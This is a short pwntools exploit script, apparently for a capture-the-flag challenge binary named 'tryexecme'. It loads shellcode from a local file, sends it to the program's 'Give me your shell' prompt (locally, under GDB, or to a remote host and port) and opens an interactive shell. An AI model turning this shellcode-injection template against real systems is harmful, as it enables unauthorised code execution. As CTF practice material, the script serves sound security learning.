from pwn import *

def start(argv=[], *a, **kwargs):
    if args.GDB:
       return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
    elif args.REMOTE:
       return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


gdbscript='''
b *main
continue
'''

exe='./tryexecme'
elf=context.binary=ELF(exe, checksec=True)
context.log_level='debug'

io = start()

with open('shellcraft','rb') as file:
    shellcode=file.read()

io.sendafter(b'Give me your shell, and I will execute it:', shellcode)

io.interactive()
